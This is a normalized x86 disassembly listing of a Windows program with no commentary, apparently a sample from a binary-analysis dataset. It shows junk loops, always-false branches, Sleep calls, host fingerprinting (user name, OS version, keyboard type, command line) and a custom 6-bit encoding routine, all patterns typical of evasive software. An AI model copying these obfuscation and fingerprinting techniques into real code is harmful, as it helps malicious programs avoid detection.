mov ecx [ ebp - 0x1404 ]
sar eax cl
movzx ecx [ ebp - 0x59 ]
or ecx eax
mov [ ebp - 0x59 ] cl
jmp r-xdata
and [ ebp - 0x1618 ] 0x0
call [ GetCommandLineW@IAT ]
mov [ ebp - 0x1614 ] eax
and [ ebp - 0x1618 ] 0x0
jmp r-xdata
movzx eax [ ebp - 0x59 ]
add eax 0x20
mov ecx [ ebp - 0x1408 ]
mov [ ecx ] al
mov eax [ ebp - 0x1408 ]
inc eax
mov [ ebp - 0x1408 ] eax
mov eax [ ebp - 0x68 ]
movsx eax [ eax ]
and eax 0x3f
add eax 0x20
mov ecx [ ebp - 0x1408 ]
mov [ ecx ] al
mov eax [ ebp - 0x68 ]
movsx eax [ eax ]
and eax 0xc0
mov ecx [ ebp - 0x1404 ]
sar eax cl
movzx ecx [ ebp - 0x59 ]
or ecx eax
mov [ ebp - 0x59 ] cl
jmp r-xdata
mov eax [ ebp - 0x454 ]
inc eax
mov [ ebp - 0x454 ] eax
mov eax [ ebp - 0x1408 ]
inc eax
mov [ ebp - 0x1408 ] eax
mov eax [ ebp - 0x1404 ]
inc eax
inc eax
mov [ ebp - 0x1404 ] eax
mov eax [ ebp - 0x68 ]
inc eax
mov [ ebp - 0x68 ] eax
mov eax [ ebp - 0x1408 ]
inc eax
mov [ ebp - 0x1408 ] eax
cmp [ ebp - 0x1618 ] 0xc8
jge r-xdata
mov eax [ ebp - 0x1404 ]
inc eax
inc eax
mov [ ebp - 0x1404 ] eax
mov eax [ ebp - 0x68 ]
inc eax
mov [ ebp - 0x68 ] eax
mov eax [ ebp - 0x1408 ]
inc eax
mov [ ebp - 0x1408 ] eax
xor eax eax
jne r-xdata
mov eax [ ebp - 0x1618 ]
and eax 0x80000001
jns r-xdata
lea eax [ ebp - 0x1630 ]
push eax
call [ GetSystemTime@IAT ]
lea eax [ ebp - 0x1620 ]
push eax
lea eax [ ebp - 0x1630 ]
push eax
call [ SystemTimeToFileTime@IAT ]
xor eax eax
jne r-xdata
mov ecx [ ebp - 0x1614 ]
movzx eax [ ecx + eax * 2 ]
test eax eax
jne r-xdata
dec eax
or eax 0xfffffffe
inc eax
lea eax [ ebp - 0x1748 ]
push eax
call [ GetVersionExW@IAT ]
xor eax eax
jne r-xdata
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x4c ] 0x64
fld1
fstp [ ebp - 0x38 ]
mov [ ebp - 0x3c ] 0x155
mov [ ebp - 0x28 ] 0x141
call sub_4137bf
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x1618 ]
add eax 0xa
mov [ ebp - 0x1618 ] eax
lea eax [ ebp - 0x1860 ]
push eax
call [ GetVersionExW@IAT ]
xor eax eax
jne r-xdata
mov [ ebp - 0x1c60 ] 0x3e8
mov [ ebp - 0x1c68 ] 0xfa0
lea eax [ ebp - 0x2c08 ]
mov [ ebp - 0x2c10 ] eax
lea eax [ ebp - 0x1c58 ]
mov [ ebp - 0x1870 ] eax
mov eax [ ebp - 0x1c60 ]
cdq
and edx 0x3
add eax edx
sar eax 0x2
mov [ ebp - 0x1868 ] eax
mov eax [ ebp - 0x1c60 ]
cdq
push 0x3
pop ecx
idiv ecx
mov [ ebp - 0x186c ] edx
mov eax [ ebp - 0x1868 ]
shl eax 0x2
mov [ ebp - 0x1c64 ] eax
cmp [ ebp - 0x186c ] 0x0
je r-xdata
mov eax [ ebp - 0x1c64 ]
inc eax
mov [ ebp - 0x1c64 ] eax
mov eax [ ebp - 0x1c64 ]
cmp eax [ ebp - 0x1c68 ]
jle r-xdata
mov eax [ ebp - 0x186c ]
mov ecx [ ebp - 0x1c64 ]
lea eax [ ecx + eax + 0x1 ]
mov [ ebp - 0x1c64 ] eax
and [ ebp - 0x1c5c ] 0x0
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x1c5c ]
cmp eax [ ebp - 0x1868 ]
jge r-xdata
mov [ ebp - 0x2c ] 0x1
jmp r-xdata
cmp [ ebp - 0x186c ] 0x0
je r-xdata
mov [ ebp - 0x2c0c ] 0x2
mov [ ebp - 0x1861 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x2c ]
cmp eax [ ebp - 0x28 ]
jg r-xdata
mov eax [ ebp - 0x2c10 ]
mov [ eax ] 0x0
xor eax eax
jne r-xdata
mov [ ebp - 0x2c0c ] 0x2
mov [ ebp - 0x1861 ] 0x0
jmp r-xdata
cmp [ ebp - 0x2c0c ] 0x5
jge r-xdata
mov [ ebp - 0x4204 ] 0x1
push 0x0
call [ GetKeyboardType@IAT ]
cmp eax 0x5
jne r-xdata
mov [ ebp - 0x50 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x186c ]
lea eax [ eax + eax + 0x1 ]
cmp [ ebp - 0x2c0c ] eax
jge r-xdata
movzx eax [ ebp - 0x1861 ]
add eax 0x20
mov ecx [ ebp - 0x2c10 ]
mov [ ecx ] al
jmp r-xdata
push 0x0
call [ Sleep@IAT ]
mov eax [ ebp - 0x1870 ]
movsx eax [ eax ]
and eax 0x3f
add eax 0x20
mov ecx [ ebp - 0x2c10 ]
mov [ ecx ] al
mov eax [ ebp - 0x1870 ]
movsx eax [ eax ]
and eax 0xc0
mov ecx [ ebp - 0x2c0c ]
sar eax cl
movzx ecx [ ebp - 0x1861 ]
or ecx eax
mov [ ebp - 0x1861 ] cl
jmp r-xdata
xor eax eax
jne r-xdata
mov eax [ ebp - 0x4204 ]
inc eax
inc eax
mov [ ebp - 0x4204 ] eax
mov eax [ ebp - 0x3c ]
cdq
push 0x28
pop ecx
idiv ecx
cmp [ ebp - 0x50 ] eax
jg r-xdata
movzx eax [ ebp - 0x1861 ]
add eax 0x20
mov ecx [ ebp - 0x2c10 ]
mov [ ecx ] al
mov eax [ ebp - 0x2c10 ]
inc eax
mov [ ebp - 0x2c10 ] eax
mov eax [ ebp - 0x1870 ]
movsx eax [ eax ]
and eax 0x3f
add eax 0x20
mov ecx [ ebp - 0x2c10 ]
mov [ ecx ] al
mov eax [ ebp - 0x1870 ]
movsx eax [ eax ]
and eax 0xc0
mov ecx [ ebp - 0x2c0c ]
sar eax cl
movzx ecx [ ebp - 0x1861 ]
or ecx eax
mov [ ebp - 0x1861 ] cl
jmp r-xdata
mov eax [ ebp - 0x1c5c ]
inc eax
mov [ ebp - 0x1c5c ] eax
mov eax [ ebp - 0x2c10 ]
inc eax
mov [ ebp - 0x2c10 ] eax
mov eax [ ebp - 0x2c0c ]
inc eax
inc eax
mov [ ebp - 0x2c0c ] eax
mov eax [ ebp - 0x1870 ]
inc eax
mov [ ebp - 0x1870 ] eax
mov eax [ ebp - 0x2c10 ]
inc eax
mov [ ebp - 0x2c10 ] eax
mov [ ebp - 0x4608 ] 0x3e8
mov [ ebp - 0x4610 ] 0xfa0
lea eax [ ebp - 0x55b0 ]
mov [ ebp - 0x55b8 ] eax
lea eax [ ebp - 0x4600 ]
mov [ ebp - 0x4214 ] eax
mov eax [ ebp - 0x4608 ]
cdq
and edx 0x3
add eax edx
sar eax 0x2
mov [ ebp - 0x420c ] eax
mov eax [ ebp - 0x4608 ]
cdq
push 0x3
pop ecx
idiv ecx
mov [ ebp - 0x4210 ] edx
mov eax [ ebp - 0x420c ]
shl eax 0x2
mov [ ebp - 0x460c ] eax
cmp [ ebp - 0x4210 ] 0x0
je r-xdata
call sub_4137bf
sub eax [ ebp - 0x24 ]
cmp eax 0xa
jbe r-xdata
fild [ ebp - 0x50 ]
fidiv [ ebp - 0x3c ]
fsub [ r--data ]
fdiv [ ebp - 0x38 ]
fmul [ r--data ]
fsub [ r--data ]
fstp [ ebp - 0x18 ]
fild [ ebp - 0x2c ]
fidiv [ ebp - 0x28 ]
fsub [ r--data ]
fdiv [ ebp - 0x38 ]
fmul [ r--data ]
fstp [ ebp - 0x48 ]
push 0x1
call [ Sleep@IAT ]
push 0x0
call [ Sleep@IAT ]
call sub_4137bf
sub eax [ ebp - 0x24 ]
cmp eax 0xa
jbe r-xdata
mov eax [ ebp - 0x2c0c ]
inc eax
inc eax
mov [ ebp - 0x2c0c ] eax
mov eax [ ebp - 0x1870 ]
inc eax
mov [ ebp - 0x1870 ] eax
mov eax [ ebp - 0x2c10 ]
inc eax
mov [ ebp - 0x2c10 ] eax
mov eax [ ebp - 0x460c ]
inc eax
mov [ ebp - 0x460c ] eax
mov eax [ ebp - 0x460c ]
cmp eax [ ebp - 0x4610 ]
jle r-xdata
mov eax [ ebp - 0x4210 ]
mov ecx [ ebp - 0x460c ]
lea eax [ ecx + eax + 0x1 ]
mov [ ebp - 0x460c ] eax
mov [ ebp - 0x50 ] 0x1
jmp r-xdata
jmp r-xdata
fldz
fstp [ ebp - 0x10 ]
fldz
fstp [ ebp - 0x8 ]
jmp r-xdata
jmp r-xdata
and [ ebp - 0x4604 ] 0x0
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x3c ]
cdq
sub eax edx
sar eax 0x1
cmp [ ebp - 0x50 ] eax
jg r-xdata
mov eax [ ebp - 0x50 ]
inc eax
mov [ ebp - 0x50 ] eax
mov eax [ ebp - 0x4604 ]
cmp eax [ ebp - 0x420c ]
jge r-xdata
push [ ebp + 0x8 ]
call sub_414299
mov ecx eax
call sub_413326
call sub_4137bf
sub eax [ ebp - 0x24 ]
cmp eax 0xa
jbe r-xdata
fild [ ebp - 0x50 ]
fidiv [ ebp - 0x3c ]
fsub [ r--data ]
fdiv [ ebp - 0x38 ]
fmul [ r--data ]
fsub [ r--data ]
fstp [ ebp - 0x18 ]
fild [ ebp - 0x2c ]
fidiv [ ebp - 0x28 ]
fsub [ r--data ]
fdiv [ ebp - 0x38 ]
fmul [ r--data ]
fstp [ ebp - 0x48 ]
push 0x1
call [ Sleep@IAT ]
push 0x0
call [ Sleep@IAT ]
fldz
fstp [ ebp - 0x10 ]
fldz
fstp [ ebp - 0x8 ]
mov [ ebp - 0x30 ] 0x1
jmp r-xdata
cmp [ ebp - 0x4210 ] 0x0
je r-xdata
mov [ ebp - 0x55b4 ] 0x2
mov [ ebp - 0x4205 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x59bc ]
inc eax
mov [ ebp - 0x59bc ] eax
mov eax [ ebp - 0x59bc ]
cmp eax [ ebp - 0x59c0 ]
jle r-xdata
mov eax [ ebp - 0x55c4 ]
mov ecx [ ebp - 0x59bc ]
lea eax [ ecx + eax + 0x1 ]
mov [ ebp - 0x59bc ] eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x30 ]
cmp eax [ ebp - 0x4c ]
jge r-xdata
mov eax [ ebp - 0x55b8 ]
mov [ eax ] 0x0
xor eax eax
jne r-xdata
mov [ ebp - 0x55b4 ] 0x2
mov [ ebp - 0x4205 ] 0x0
jmp r-xdata
cmp [ ebp - 0x55b4 ] 0x5
jge r-xdata
and [ ebp - 0x59b4 ] 0x0
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x2c ]
inc eax
mov [ ebp - 0x2c ] eax
call sub_4137bf
sub eax [ ebp - 0x24 ]
cmp eax 0xa
jbe r-xdata
call sub_4137bf
sub eax [ ebp - 0x24 ]
cmp eax 0xa
jbe r-xdata
mov eax [ ebp - 0x4210 ]
lea eax [ eax + eax + 0x1 ]
cmp [ ebp - 0x55b4 ] eax
jge r-xdata
movzx eax [ ebp - 0x4205 ]
add eax 0x20
mov ecx [ ebp - 0x55b8 ]
mov [ ecx ] al
jmp r-xdata
push 0x0
call [ Sleep@IAT ]
mov eax [ ebp - 0x4214 ]
movsx eax [ eax ]
and eax 0x3f
add eax 0x20
mov ecx [ ebp - 0x55b8 ]
mov [ ecx ] al
mov eax [ ebp - 0x4214 ]
movsx eax [ eax ]
and eax 0xc0
mov ecx [ ebp - 0x55b4 ]
sar eax cl
movzx ecx [ ebp - 0x4205 ]
or ecx eax
mov [ ebp - 0x4205 ] cl
jmp r-xdata
mov eax [ ebp - 0x59b4 ]
cmp eax [ ebp - 0x55c0 ]
jge r-xdata
call sub_414299
mov edx [ ebp + 0x10 ]
mov ecx eax
call sub_41d4c0
lea eax [ ebp - 0x2c28 ]
push eax
call [ GetSystemTime@IAT ]
lea eax [ ebp - 0x2c18 ]
push eax
lea eax [ ebp - 0x2c28 ]
push eax
call [ SystemTimeToFileTime@IAT ]
xor eax eax
jne r-xdata
jmp r-xdata
fld [ ebp - 0x10 ]
fmul [ ebp - 0x10 ]
fld [ ebp - 0x8 ]
fmul [ ebp - 0x8 ]
fsubp st1
fadd [ ebp - 0x18 ]
fstp [ ebp - 0x20 ]
fld [ r--data ]
fmul [ ebp - 0x10 ]
fmul [ ebp - 0x8 ]
fadd [ ebp - 0x48 ]
fstp [ ebp - 0x8 ]
fld [ ebp - 0x20 ]
fstp [ ebp - 0x10 ]
fld [ ebp - 0x10 ]
fmul [ ebp - 0x10 ]
fld [ ebp - 0x8 ]
fmul [ ebp - 0x8 ]
faddp st1
fcomp [ r--data ]
fnstsw ax
test ah 0x41
jne r-xdata
jmp r-xdata
movzx eax [ ebp - 0x4205 ]
add eax 0x20
mov ecx [ ebp - 0x55b8 ]
mov [ ecx ] al
mov eax [ ebp - 0x55b8 ]
inc eax
mov [ ebp - 0x55b8 ] eax
mov eax [ ebp - 0x4214 ]
movsx eax [ eax ]
and eax 0x3f
add eax 0x20
mov ecx [ ebp - 0x55b8 ]
mov [ ecx ] al
mov eax [ ebp - 0x4214 ]
movsx eax [ eax ]
and eax 0xc0
mov ecx [ ebp - 0x55b4 ]
sar eax cl
movzx ecx [ ebp - 0x4205 ]
or ecx eax
mov [ ebp - 0x4205 ] cl
jmp r-xdata
mov eax [ ebp - 0x4604 ]
inc eax
mov [ ebp - 0x4604 ] eax
mov eax [ ebp - 0x55b8 ]
inc eax
mov [ ebp - 0x55b8 ] eax
mov eax [ ebp - 0x55b4 ]
inc eax
inc eax
mov [ ebp - 0x55b4 ] eax
mov eax [ ebp - 0x4214 ]
inc eax
mov [ ebp - 0x4214 ] eax
mov eax [ ebp - 0x55b8 ]
inc eax
mov [ ebp - 0x55b8 ] eax
cmp [ ebp - 0x55c4 ] 0x0
je r-xdata
mov [ ebp - 0x6964 ] 0x2
mov [ ebp - 0x55b9 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x6d6c ]
inc eax
mov [ ebp - 0x6d6c ] eax
mov eax [ ebp - 0x6d6c ]
cmp eax [ ebp - 0x6d70 ]
jle r-xdata
mov eax [ ebp - 0x6974 ]
mov ecx [ ebp - 0x6d6c ]
lea eax [ ecx + eax + 0x1 ]
mov [ ebp - 0x6d6c ] eax
mov [ ebp - 0x3028 ] 0x3e8
mov [ ebp - 0x3030 ] 0xfa0
lea eax [ ebp - 0x3fd0 ]
mov [ ebp - 0x3fd8 ] eax
lea eax [ ebp - 0x3020 ]
mov [ ebp - 0x2c38 ] eax
mov eax [ ebp - 0x3028 ]
cdq
and edx 0x3
add eax edx
sar eax 0x2
mov [ ebp - 0x2c30 ] eax
mov eax [ ebp - 0x3028 ]
cdq
push 0x3
pop ecx
idiv ecx
mov [ ebp - 0x2c34 ] edx
mov eax [ ebp - 0x2c30 ]
shl eax 0x2
mov [ ebp - 0x302c ] eax
cmp [ ebp - 0x2c34 ] 0x0
je r-xdata
jmp r-xdata
mov [ ebp - 0x30 ] 0x1869f
mov eax [ ebp - 0x55b4 ]
inc eax
inc eax
mov [ ebp - 0x55b4 ] eax
mov eax [ ebp - 0x4214 ]
inc eax
mov [ ebp - 0x4214 ] eax
mov eax [ ebp - 0x55b8 ]
inc eax
mov [ ebp - 0x55b8 ] eax
mov eax [ ebp - 0x6968 ]
mov [ eax ] 0x0
xor eax eax
jne r-xdata
mov [ ebp - 0x6964 ] 0x2
mov [ ebp - 0x55b9 ] 0x0
jmp r-xdata
cmp [ ebp - 0x6964 ] 0x5
jge r-xdata
and [ ebp - 0x6d64 ] 0x0
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x302c ]
inc eax
mov [ ebp - 0x302c ] eax
mov eax [ ebp - 0x302c ]
cmp eax [ ebp - 0x3030 ]
jle r-xdata
mov eax [ ebp - 0x2c34 ]
mov ecx [ ebp - 0x302c ]
lea eax [ ecx + eax + 0x1 ]
mov [ ebp - 0x302c ] eax
mov eax [ ebp - 0x30 ]
inc eax
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x59b8 ] 0x3e8
mov [ ebp - 0x59c0 ] 0xfa0
lea eax [ ebp - 0x6960 ]
mov [ ebp - 0x6968 ] eax
lea eax [ ebp - 0x59b0 ]
mov [ ebp - 0x55c8 ] eax
mov eax [ ebp - 0x59b8 ]
cdq
and edx 0x3
add eax edx
sar eax 0x2
mov [ ebp - 0x55c0 ] eax
mov eax [ ebp - 0x59b8 ]
cdq
push 0x3
pop ecx
idiv ecx
mov [ ebp - 0x55c4 ] edx
mov eax [ ebp - 0x55c0 ]
shl eax 0x2
mov [ ebp - 0x59bc ] eax
cmp [ ebp - 0x55c4 ] 0x0
je r-xdata
mov eax [ ebp - 0x55c4 ]
lea eax [ eax + eax + 0x1 ]
cmp [ ebp - 0x6964 ] eax
jge r-xdata
movzx eax [ ebp - 0x55b9 ]
add eax 0x20
mov ecx [ ebp - 0x6968 ]
mov [ ecx ] al
jmp r-xdata
push 0x0
call [ Sleep@IAT ]
mov eax [ ebp - 0x55c8 ]
movsx eax [ eax ]
and eax 0x3f
add eax 0x20
mov ecx [ ebp - 0x6968 ]
mov [ ecx ] al
mov eax [ ebp - 0x55c8 ]
movsx eax [ eax ]
and eax 0xc0
mov ecx [ ebp - 0x6964 ]
sar eax cl
movzx ecx [ ebp - 0x55b9 ]
or ecx eax
mov [ ebp - 0x55b9 ] cl
jmp r-xdata
mov eax [ ebp - 0x6d64 ]
cmp eax [ ebp - 0x6970 ]
jge r-xdata
xor eax eax
leave
retn 0x10
and [ ebp - 0x3024 ] 0x0
jmp r-xdata
jmp r-xdata
movzx eax [ ebp - 0x55b9 ]
add eax 0x20
mov ecx [ ebp - 0x6968 ]
mov [ ecx ] al
mov eax [ ebp - 0x6968 ]
inc eax
mov [ ebp - 0x6968 ] eax
mov eax [ ebp - 0x55c8 ]
movsx eax [ eax ]
and eax 0x3f
add eax 0x20
mov ecx [ ebp - 0x6968 ]
mov [ ecx ] al
mov eax [ ebp - 0x55c8 ]
movsx eax [ eax ]
and eax 0xc0
mov ecx [ ebp - 0x6964 ]
sar eax cl
movzx ecx [ ebp - 0x55b9 ]
or ecx eax
mov [ ebp - 0x55b9 ] cl
jmp r-xdata
mov eax [ ebp - 0x59b4 ]
inc eax
mov [ ebp - 0x59b4 ] eax
mov eax [ ebp - 0x6968 ]
inc eax
mov [ ebp - 0x6968 ] eax
mov eax [ ebp - 0x6964 ]
inc eax
inc eax
mov [ ebp - 0x6964 ] eax
mov eax [ ebp - 0x55c8 ]
inc eax
mov [ ebp - 0x55c8 ] eax
mov eax [ ebp - 0x6968 ]
inc eax
mov [ ebp - 0x6968 ] eax
cmp [ ebp - 0x6974 ] 0x0
je r-xdata
mov [ ebp - 0x7d14 ] 0x2
mov [ ebp - 0x6969 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x3024 ]
cmp eax [ ebp - 0x2c30 ]
jge r-xdata
mov [ ebp - 0x3fdc ] 0x1
mov eax [ ebp - 0x6964 ]
inc eax
inc eax
mov [ ebp - 0x6964 ] eax
mov eax [ ebp - 0x55c8 ]
inc eax
mov [ ebp - 0x55c8 ] eax
mov eax [ ebp - 0x6968 ]
inc eax
mov [ ebp - 0x6968 ] eax
mov eax [ ebp - 0x7d18 ]
mov [ eax ] 0x0
xor eax eax
jne r-xdata
mov [ ebp - 0x7d14 ] 0x2
mov [ ebp - 0x6969 ] 0x0
jmp r-xdata
cmp [ ebp - 0x7d14 ] 0x5
jge r-xdata
cmp [ ebp - 0x2c34 ] 0x0
je r-xdata
mov [ ebp - 0x3fd4 ] 0x2
mov [ ebp - 0x2c29 ] 0x0
jmp r-xdata
xor eax eax
inc eax
jne r-xdata
jmp r-xdata
mov [ ebp - 0x6d68 ] 0x3e8
mov [ ebp - 0x6d70 ] 0xfa0
lea eax [ ebp - 0x7d10 ]
mov [ ebp - 0x7d18 ] eax
lea eax [ ebp - 0x6d60 ]
mov [ ebp - 0x6978 ] eax
mov eax [ ebp - 0x6d68 ]
cdq
and edx 0x3
add eax edx
sar eax 0x2
mov [ ebp - 0x6970 ] eax
mov eax [ ebp - 0x6d68 ]
cdq
push 0x3
pop ecx
idiv ecx
mov [ ebp - 0x6974 ] edx
mov eax [ ebp - 0x6970 ]
shl eax 0x2
mov [ ebp - 0x6d6c ] eax
cmp [ ebp - 0x6974 ] 0x0
je r-xdata
mov eax [ ebp - 0x6974 ]
lea eax [ eax + eax + 0x1 ]
cmp [ ebp - 0x7d14 ] eax
jge r-xdata
movzx eax [ ebp - 0x6969 ]
add eax 0x20
mov ecx [ ebp - 0x7d18 ]
mov [ ecx ] al
jmp r-xdata
push 0x0
call [ Sleep@IAT ]
mov eax [ ebp - 0x6978 ]
movsx eax [ eax ]
and eax 0x3f
add eax 0x20
mov ecx [ ebp - 0x7d18 ]
mov [ ecx ] al
mov eax [ ebp - 0x6978 ]
movsx eax [ eax ]
and eax 0xc0
mov ecx [ ebp - 0x7d14 ]
sar eax cl
movzx ecx [ ebp - 0x6969 ]
or ecx eax
mov [ ebp - 0x6969 ] cl
jmp r-xdata
mov eax [ ebp - 0x3fd8 ]
mov [ eax ] 0x0
xor eax eax
jne r-xdata
mov [ ebp - 0x3fd4 ] 0x2
mov [ ebp - 0x2c29 ] 0x0
jmp r-xdata
cmp [ ebp - 0x3fd4 ] 0x5
jge r-xdata
mov [ ebp - 0x3fe0 ] 0x214
lea eax [ ebp - 0x3fe0 ]
push eax
lea eax [ ebp - 0x41f8 ]
push eax
call [ GetUserNameW@IAT ]
mov eax [ ebp - 0x3fdc ]
mov ecx [ ebp - 0x3fdc ]
inc ecx
mov [ ebp - 0x3fdc ] ecx
cmp eax 0x19
jle r-xdata
xor eax eax
jne r-xdata
movzx eax [ ebp - 0x6969 ]
add eax 0x20
mov ecx [ ebp - 0x7d18 ]
mov [ ecx ] al
mov eax [ ebp - 0x7d18 ]
inc eax
mov [ ebp - 0x7d18 ] eax
mov eax [ ebp - 0x6978 ]
movsx eax [ eax ]
and eax 0x3f
add eax 0x20
mov ecx [ ebp - 0x7d18 ]
mov [ ecx ] al
mov eax [ ebp - 0x6978 ]
movsx eax [ eax ]
and eax 0xc0
mov ecx [ ebp - 0x7d14 ]
sar eax cl
movzx ecx [ ebp - 0x6969 ]
or ecx eax
mov [ ebp - 0x6969 ] cl
jmp r-xdata
mov eax [ ebp - 0x6d64 ]
inc eax
mov [ ebp - 0x6d64 ] eax
mov eax [ ebp - 0x7d18 ]
inc eax
mov [ ebp - 0x7d18 ] eax
mov eax [ ebp - 0x7d14 ]
inc eax
inc eax
mov [ ebp - 0x7d14 ] eax
mov eax [ ebp - 0x6978 ]
inc eax
mov [ ebp - 0x6978 ] eax
mov eax [ ebp - 0x7d18 ]
inc eax
mov [ ebp - 0x7d18 ] eax
mov eax [ ebp - 0x2c34 ]
lea eax [ eax + eax + 0x1 ]
cmp [ ebp - 0x3fd4 ] eax
jge r-xdata
movzx eax [ ebp - 0x2c29 ]
add eax 0x20
mov ecx [ ebp - 0x3fd8 ]
mov [ ecx ] al
jmp r-xdata
push 0x0
call [ Sleep@IAT ]
mov eax [ ebp - 0x2c38 ]
movsx eax [ eax ]
and eax 0x3f
add eax 0x20
mov ecx [ ebp - 0x3fd8 ]
mov [ ecx ] al
mov eax [ ebp - 0x2c38 ]
movsx eax [ eax ]
and eax 0xc0
mov ecx [ ebp - 0x3fd4 ]
sar eax cl
movzx ecx [ ebp - 0x2c29 ]
or ecx eax
mov [ ebp - 0x2c29 ] cl
jmp r-xdata
cmp [ ebp - 0x30 ] 0x1869f
jge r-xdata
mov eax [ ebp - 0x7d14 ]
inc eax
inc eax
mov [ ebp - 0x7d14 ] eax
mov eax [ ebp - 0x6978 ]
inc eax
mov [ ebp - 0x6978 ] eax
mov eax [ ebp - 0x7d18 ]
inc eax
mov [ ebp - 0x7d18 ] eax
movzx eax [ ebp - 0x2c29 ]
add eax 0x20
mov ecx [ ebp - 0x3fd8 ]
mov [ ecx ] al
mov eax [ ebp - 0x3fd8 ]
inc eax
mov [ ebp - 0x3fd8 ] eax
mov eax [ ebp - 0x2c38 ]
movsx eax [ eax ]
and eax 0x3f
add eax 0x20
mov ecx [ ebp - 0x3fd8 ]
mov [ ecx ] al
mov eax [ ebp - 0x2c38 ]
movsx eax [ eax ]
and eax 0xc0
mov ecx [ ebp - 0x3fd4 ]
sar eax cl
movzx ecx [ ebp - 0x2c29 ]
or ecx eax
mov [ ebp - 0x2c29 ] cl
jmp r-xdata
mov eax [ ebp - 0x3024 ]
inc eax
mov [ ebp - 0x3024 ] eax
mov eax [ ebp - 0x3fd8 ]
inc eax
mov [ ebp - 0x3fd8 ] eax
mov eax [ ebp - 0x3fd4 ]
inc eax
inc eax
mov [ ebp - 0x3fd4 ] eax
mov eax [ ebp - 0x2c38 ]
inc eax
mov [ ebp - 0x2c38 ] eax
mov eax [ ebp - 0x3fd8 ]
inc eax
mov [ ebp - 0x3fd8 ] eax
jmp r-xdata
and [ ebp - 0x4200 ] 0x0
call [ GetCommandLineW@IAT ]
mov [ ebp - 0x41fc ] eax
and [ ebp - 0x4200 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x3fd4 ]
inc eax
inc eax
mov [ ebp - 0x3fd4 ] eax
mov eax [ ebp - 0x2c38 ]
inc eax
mov [ ebp - 0x2c38 ] eax
mov eax [ ebp - 0x3fd8 ]
inc eax
mov [ ebp - 0x3fd8 ] eax
cmp [ ebp - 0x4200 ] 0x14
jge r-xdata
xor eax eax
jne r-xdata
mov eax [ ebp - 0x4200 ]
and eax 0x80000001
jns r-xdata
jmp r-xdata
mov ecx [ ebp - 0x41fc ]
movzx eax [ ecx + eax * 2 ]
test eax eax
jne r-xdata
dec eax
or eax 0xfffffffe
inc eax
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x50 ]
inc eax
mov [ ebp - 0x50 ] eax
mov eax [ ebp - 0x4200 ]
inc eax
mov [ ebp - 0x4200 ] eax
sub_41e779
push ebp
mov ebp esp
push 0xffffffff
push sub_423a09
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x38
mov [ ebp - 0x44 ] ecx
and [ ebp - 0x40 ] 0x0
lea ecx [ ebp - 0x3c ]
call sub_416c24
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0x1c ]
call sub_401068
mov [ ebp - 0x4 ] 0x2
mov eax [ ebp + 0x10 ]
push [ eax ]
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp + 0xc ]
push [ eax ]
mov ecx [ ebp - 0x44 ]
call sub_416c76
movzx eax al
test eax eax
je r-xdata
lea eax [ ebp - 0x3c ]
push eax
mov ecx [ ebp + 0x8 ]
call sub_40172a
mov eax [ ebp - 0x40 ]
or eax 0x1
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0x1c ]
call sub_4010a3
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x3c ]
call sub_416bd2
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn 0xc
lea eax [ ebp - 0x1c ]
push eax
lea ecx [ ebp - 0x3c ]
call sub_416d22
sub_41e81d
push ebp
mov ebp esp
push 0xffffffff
push sub_423a23
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
push esi
mov [ ebp - 0x24 ] ecx
mov ecx [ ebp - 0x24 ]
call sub_416c24
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x20 ]
call sub_401068
mov [ ebp - 0x4 ] 0x1
mov ecx [ ebp - 0x24 ]
call sub_416bb4
push 0x54d
call sub_414299
mov edx rw-data
mov ecx eax
call sub_415aba
mov [ ebp - 0x10 ] eax
push 0x1
push [ ebp - 0x10 ]
lea ecx [ ebp - 0x20 ]
call sub_4105e1
push 0x54d
push rw-data
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x20 ]
call sub_40100f
mov esi eax
call sub_414299
mov edx esi
mov ecx eax
call sub_415ad6
movzx eax al
test eax eax
jne r-xdata
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebp - 0x24 ]
call sub_416d22
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x20 ]
call sub_4010a3
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x24 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop esi
leave
retn
sub_41e8dd
push ebp
mov ebp esp
push 0xffffffff
push sub_423b46
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
mov eax [ rw-data ]
and eax 0x1
jne r-xdata
mov eax rw-data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
mov eax [ rw-data ]
or eax 0x1
mov [ rw-data ] eax
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
call sub_41e81d
push sub_42431e
call sub_402b39
pop ecx
or [ ebp - 0x4 ] 0xffffffff
sub_41e93a
push ebp
mov ebp esp
push 0xffffffff
push sub_423a87
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x48
lea ecx [ ebp - 0x2c ]
call sub_401068
and [ ebp - 0x4 ] 0x0
and [ ebp - 0x34 ] 0x0
and [ ebp - 0x38 ] 0x0
and [ ebp - 0x3c ] 0x0
and [ ebp - 0x10 ] 0x0
